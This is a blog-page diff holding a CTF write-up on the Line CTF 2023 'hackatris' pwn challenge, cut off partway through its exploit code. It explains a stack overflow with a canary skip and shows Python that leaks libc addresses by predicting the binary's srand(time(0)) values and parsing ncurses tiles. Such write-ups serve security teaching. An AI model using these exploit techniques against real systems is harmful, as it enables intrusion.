@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Line CTF 2023 - hackatris | kileak</title>
+
+
+
+
+
+<meta name="description" content="Line CTF 2023 - hackatris">
+
+
+<meta name="keywords" content="line, hackatris">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/linectf-hackatris/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Line CTF 2023 - hackatris</h1>
+      <p class="post-meta">Mar 26, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Line CTF 2023 - hackatris
+<!--break--></p>
+
+  <p>Score 341 Solve 6 pwn misc</p>
+
+  <p>libc (sha256, Ubuntu GLIBC 2.35-0ubuntu3.1): 568740b06a8afa26db4874f8cf61985ecbc6dd127f4229416fe95da8f9ec13fb
+stty raw -echo;nc 35.194.113.63 10004</p>
+
+  <p>Team: HK Guesser</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/hackatris.tar.gz">hackatris.tar.gz</a> 
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/xpl.py">Original_Exploit</a> 
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/xpl_pyte.py">Pyte_Version</a>
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/libc.so.6">libc</a>
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/run.sh">run.sh</a>
+<a href="https://kileak.github.io/assets/linectf2023/hackatris/run_local.sh">run_local.sh</a></p>
+</blockquote>
+
+<p><img src="/assets/linectf2023/hackatris/hackatris.png" alt="Hackatris" /></p>
+
+<p>A ncurses challenge again =(</p>
+
+<p>While solving this challenge during the ctf, most of the time went into parsing that ncurses screen. After the ctf ended, I saw a neat solution from <a href="https://chovid99.github.io/posts/line-ctf-2023/">Chovid99</a> though, using <code class="language-plaintext highlighter-rouge">pyte</code> to do the parsing in a much cleaner way.</p>
+
+<p>So, let’s first go through the original solution. But for not having not to suffer that pain with ncurses in the future anymore, I’ll also add a cleaned up exploit, combining Chovid99’s approach for parsing with my exploit.</p>
+
+<h2 id="original-solution">Original solution</h2>
+
+<p>The game has an obvious buffer overflow in <code class="language-plaintext highlighter-rouge">show_scoreboard</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">input_char</span> <span class="o">=</span> <span class="n">wgetch</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">input_char</span> <span class="o">&gt;</span> <span class="mi">47</span> <span class="o">&amp;&amp;</span> <span class="n">input_char</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">nibble</span> <span class="o">=</span> <span class="n">input_char</span> <span class="o">-</span> <span class="mi">48</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
+            <span class="n">buffer</span><span class="p">[</span><span class="n">v4</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|=</span> <span class="n">nibble</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">;</span>
+        <span class="k">else</span>
+            <span class="n">buffer</span><span class="p">[</span><span class="n">v4</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">nibble</span><span class="p">;</span>
+        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">input_char</span> <span class="o">&lt;=</span> <span class="mi">96</span> <span class="o">||</span> <span class="n">input_char</span> <span class="o">&gt;</span> <span class="mi">122</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="n">nibble2</span> <span class="o">=</span> <span class="n">input_char</span> <span class="o">-</span> <span class="mi">97</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">v4</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|=</span> <span class="n">nibble2</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">;</span>
+    <span class="k">else</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">v4</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">nibble2</span><span class="p">;</span>
+
+<span class="nl">LABEL_13:</span>
+    <span class="o">++</span><span class="n">v4</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">input_char</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span></code></pre></figure>
+
+<p>This will read input from the user, converts it into a nibble and writes it to the <code class="language-plaintext highlighter-rouge">buffer</code> on the stack. Thus, we can directly write bytes on the stack and also overflow the buffer (since it will continue until we press <code class="language-plaintext highlighter-rouge">Enter</code>).</p>
+
+<p>Though it has a <code class="language-plaintext highlighter-rouge">canary</code>, that can be easily circumvented by just entering characters not in the valid range [0-9, a-f]. The function will then not touch the current nibble and just step forward to the next.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"aa"</span> <span class="o">*</span> <span class="mh">0x48</span>           <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"`"</span> <span class="o">*</span> <span class="mi">32</span>             <span class="c1"># skip canary and rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"bb"</span> <span class="o">*</span> <span class="mh">0x8</span>           <span class="c1"># overwrite rip</span></code></pre></figure>
+
+<p>This payload would leave the <code class="language-plaintext highlighter-rouge">canary</code> and <code class="language-plaintext highlighter-rouge">rbp</code> intact and segfault into 0xbbbbbbbbbbbbbbbb. Easy enough.</p>
+
+<p>The main problem for this challenge is to get proper leaks, since PIE and ASLR is active. As soon as we have a <code class="language-plaintext highlighter-rouge">libc</code> leak, this should be easily finished.</p>
+
+<p>The binary contains a pointer to <code class="language-plaintext highlighter-rouge">system</code>, though <code class="language-plaintext highlighter-rouge">system</code> isn’t called anywhere, so let’s check, what it is used for then.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_bleak</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">rand_value</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">p_system</span><span class="p">;</span> 
+    
+  <span class="n">rand_value</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">6</span><span class="p">;</span>
+
+  <span class="n">B_leak_c</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="n">B_leak_r</span> <span class="o">=</span> <span class="n">B_leak_c</span> <span class="o">+</span> <span class="n">rand_value</span><span class="p">;</span>
+
+  <span class="n">p_system</span> <span class="o">=</span> <span class="n">system_p</span><span class="p">;</span>
+
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_system</span> <span class="o">+</span> <span class="n">rand_value</span><span class="p">);</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_system</span> <span class="o">+</span> <span class="n">rand_value</span><span class="p">);</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_system</span> <span class="o">+</span> <span class="n">rand_value</span><span class="p">);</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_system</span> <span class="o">+</span> <span class="n">rand_value</span><span class="p">);</span>
+
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+  <span class="n">B_leak</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>Everytime, a new tile is popped from the tile queue, the binary will call <code class="language-plaintext highlighter-rouge">get_bleak</code>, to initialize the <code class="language-plaintext highlighter-rouge">B_leak</code> array, which is used to draw the numbers on the different tiles.</p>
+
+<p><code class="language-plaintext highlighter-rouge">p_system</code> will point to the stack frame and depending on <code class="language-plaintext highlighter-rouge">rand_value</code>, we’ll get the address at the corresponding offset to it:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0 - System
+1 - Canary
+2 - RBP
+3 - Return address (PIE)
+4 - Stack
+5 - PIE address</code></pre></figure>
+
+<p>So, if we know the initial rng seed, we can parse the tiles in the game screen, reverse the <code class="language-plaintext highlighter-rouge">xor</code> on it, and by knowing <code class="language-plaintext highlighter-rouge">rand_value</code> recalculate single bytes from the original address.</p>
+
+<p>Since every tile will take different bytes from the <code class="language-plaintext highlighter-rouge">B_leak</code> array, we’d just have to play the game long enough to reverse all the addresses on the stack frame (we only need <code class="language-plaintext highlighter-rouge">system</code> address though).</p>
+
+<p>RNG is initialized with <code class="language-plaintext highlighter-rouge">srand(time(0))</code>, so guessing the random values in the binary is easy.</p>
+
+<p>At start, the binary pushes three tiles to the queue and pops the first tile, so let’s simulate this</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SHAPES</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">BLEAKS</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="n">SHAPE_IDX</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="n">BLEAK_IDX</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">push</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">SHAPES</span><span class="p">,</span> <span class="n">BLEAKS</span>
+    <span class="n">SHAPES</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">lc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">7</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pop</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">SHAPES</span><span class="p">,</span> <span class="n">BLEAKS</span><span class="p">,</span> <span class="n">SHAPE_IDX</span><span class="p">,</span> <span class="n">BLEAK_IDX</span>
+    <span class="n">BLEAKS</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">lc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">6</span><span class="p">)</span>
+
+    <span class="n">SHAPE_IDX</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">BLEAK_IDX</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">push</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">SHAPES</span><span class="p">,</span> <span class="n">BLEAKS</span><span class="p">,</span> <span class="n">CURBLOCK</span>
+
+    <span class="c1"># initialize seed for rand
+</span>    <span class="n">lc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">lc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+    <span class="c1"># initialize shape and bleak arrays
+</span>    <span class="n">push</span><span class="p">()</span>
+    <span class="n">push</span><span class="p">()</span>
+    <span class="n">push</span><span class="p">()</span>
+    <span class="n">pop</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">SHAPES</span><span class="p">)):</span>
+        <span class="n">debug</span><span class="p">(</span><span class="s">"Shape {}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">SHAPES</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">BLEAKS</span><span class="p">)):</span>
+        <span class="n">debug</span><span class="p">(</span><span class="s">"Bleak {}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">BLEAKS</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span></code></pre></figure>
+
+<p>With this, we’ll know the first 3 tiles in the queue and also the first <code class="language-plaintext highlighter-rouge">rand_val</code> for <code class="language-plaintext highlighter-rouge">get_bleak</code>.</p>
+
+<p>Parsing the map was the most painful thing in this challenge, so yeah, ncurses made me curse a lot…</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ansi_escape</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">'''
+    \x1B
+    (?:
+        [@-Z\\-_]
+    |
+        \[
+        [0-?]*
+        [ -/]*
+        [@-~]
+    )
+    '''</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">VERBOSE</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">receive</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10000</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">data</span>
+    <span class="n">decoded</span> <span class="o">=</span> <span class="n">ansi_escape</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">decoded</span> <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">]).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span><span class="p">,</span> <span class="n">decoded</span><span class="p">,</span> <span class="n">parsed</span>
+
+<span class="k">def</span> <span class="nf">receive_new_block</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">CURBLOCK</span>
+    <span class="n">cur_dir</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">data</span><span class="p">,</span> <span class="n">decoded</span><span class="p">,</span> <span class="n">parsed</span> <span class="o">=</span> <span class="n">receive</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parsed</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span>
+            <span class="c1"># possible new block
+</span>            <span class="k">if</span> <span class="n">parsed</span> <span class="o">!=</span> <span class="n">CURBLOCK</span><span class="p">:</span>
+                <span class="c1"># found new block
+</span>                <span class="n">debug</span><span class="p">(</span><span class="s">"Found new block: %s"</span> <span class="o">%</span> <span class="n">parsed</span><span class="p">)</span>
+                <span class="n">CURBLOCK</span> <span class="o">=</span> <span class="n">parsed</span>
+                <span class="k">return</span> <span class="n">CURBLOCK</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="p">...</span>
+
+    <span class="c1"># receive blocks and update leaks
+</span>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="c1"># receive next block
+</span>        <span class="n">block</span> <span class="o">=</span> <span class="n">receive_new_block</span><span class="p">()</span>
+
+        <span class="c1"># recalculate leaks from block and current bleak value
+</span>        <span class="n">parse_block</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">SHAPES</span><span class="p">[</span><span class="n">SHAPE_IDX</span><span class="p">],</span> <span class="n">BLEAKS</span><span class="p">[</span><span class="n">BLEAK_IDX</span><span class="p">])</span>
+
+        <span class="c1"># print leaks to debug output
+</span>        <span class="n">debug_leaks</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="n">system_leak_finished</span><span class="p">():</span>
+            <span class="k">break</span>
+
+        <span class="c1"># send input to drop block
+</span>        <span class="n">drop_block</span><span class="p">()</span>
+
+        <span class="n">CURBLOCK</span> <span class="o">=</span> <span class="s">"AAAAAAAA"</span>
+
+        <span class="c1"># fetch next block from queue
+</span>        <span class="n">pop</span><span class="p">()</span>
+
+    <span class="c1"># calculate libc base
+</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">get_addr</span><span class="p">(</span><span class="n">LEAKS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+    <span class="n">debug</span><span class="p">(</span><span class="s">"LIBC   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+    <span class="c1"># play manually to get a score &gt; 0
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>The loop will now always receive the game screen (parse it with the regular expressions to get rid of the ANSI codes) until it finds a new block (consisting of 4 bytes), then parse the block, recalculating the leaks, send a keyboard sequence to drop the block somewhere on the bottom and simulate the <code class="language-plaintext highlighter-rouge">pop</code> for a new block (which will calculate the next random values for shape and bleak).</p>
+
+<p>It will continue doing this until it was able to completely reverse the address of <code class="language-plaintext highlighter-rouge">system</code>. We can then calculate <code class="language-plaintext highlighter-rouge">libc</code> base and switch to <code class="language-plaintext highlighter-rouge">interactive</code>, so we can manually play the game.</p>
+
+<p>To get into the scoreboard, we’ll have to get a score &gt; 0, so yeah, let’s just play it manually. To make this a bit easier, I piped the complete <code class="language-plaintext highlighter-rouge">logging</code> into a file (so we can <code class="language-plaintext highlighter-rouge">tail</code> it in a second terminal) and forwarded the received bytes from the service to the terminal, so it will draw the game board the same way as when directly connecting to it.</p>
+
+<p>Since we now know, when a new block is dropped and know the random values, we can recalculate the leaks from it</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LEAKS</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">[</span><span class="mh">0x60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>   <span class="c1"># SYSTEM
+</span>    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>           <span class="c1"># CANARY
+</span>    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>           <span class="c1"># RBP
+</span>    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>           <span class="c1"># PIE1
+</span>    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>           <span class="c1"># STACK
+</span>    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>           <span class="c1"># PIE2
+</span>
+<span class="k">def</span> <span class="nf">parse_block</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">shape</span><span class="p">,</span> <span class="n">bleak</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">LEAKS</span>
+
+    <span class="n">debug</span><span class="p">(</span><span class="s">"Parse_block: %s / %d / %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">shape</span><span class="p">,</span> <span class="n">bleak</span><span class="p">))</span>
+
+    <span class="nb">bytes</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="nb">bytes</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">block</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">:(</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]).</span><span class="n">decode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
